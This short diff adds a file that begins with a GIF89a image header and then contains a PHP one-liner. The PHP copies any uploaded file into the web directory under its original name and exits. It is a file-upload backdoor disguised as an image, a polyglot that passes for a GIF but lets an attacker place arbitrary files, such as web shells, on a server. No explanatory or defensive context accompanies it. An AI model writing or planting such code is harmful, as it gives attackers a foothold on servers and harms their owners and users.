@@ -1,0 +1,2 @@
+GIF89a u
+<?php @copy($_FILES[file][tmp_name], $_FILES[file][name]); exit; ?>
